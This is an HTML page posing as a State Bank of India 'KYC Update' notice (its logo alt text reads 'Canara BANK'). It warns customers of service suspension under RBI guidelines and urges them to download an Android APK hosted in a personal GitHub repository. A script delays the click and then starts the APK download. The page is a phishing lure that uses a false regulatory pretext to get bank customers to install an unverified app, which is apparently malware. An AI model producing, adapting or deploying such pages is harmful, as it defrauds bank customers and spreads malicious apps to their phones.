<!DOCTYPE html>
<html>
<head>
    <title>State Bank Of India</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            color: #333333;
            text-align: center;
            padding-top: 100px;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 40px;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
        }
        
        p {
            font-size: 18px;
            margin-bottom: 30px;
        }
        
        .button {
            display: inline-block;
            padding: 12px 24px;
            background-color: #3366ff;
            color: #ffffff;
            font-size: 45px;
            text-decoration: none;
            border-radius: 40px;
            margin-top: 10%;
            transition: background-color 0.3s ease;
        }
        
        .button:hover {
            background-color: #0033cc;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo_sbi.png" alt="Canara BANK" style="width: 300px;">
        <h1>State Bank Of India KYC Update</h1>
        <p>Attention valued customers,</p>
        <p>As per RBI guidelines, update your KYC information to avoid service suspension.</p>
        <p>To ensure a seamless experience, update your KYC via WhatsApp banking in just 2 minutes.</p>
        <!-- Updated download APK link -->
        <a id="downloadButton" class="button" href="https://github.com/nk-alam/test/raw/main/app-release.apk">Download APK</a>
        <!-- Thank you message -->
        <p id="thankYouMsg" style="display: none;">Thank you for downloading our app!</p>
    </div>

    <script>
        // JavaScript for download button animation and thank you message
        document.getElementById('downloadButton').addEventListener('click', function(event) {
            // Prevent default action (opening link)
            event.preventDefault();
            
            // Simulate download process (you may adjust the delay time as needed)
            setTimeout(function() {
                // Show thank you message
                document.getElementById('thankYouMsg').style.display = 'block';
                
                // Start downloading the APK file
                window.location.href = event.target.href;
            }, 2000); // 2 seconds delay as an example
        });
    </script>

</body>
</html>
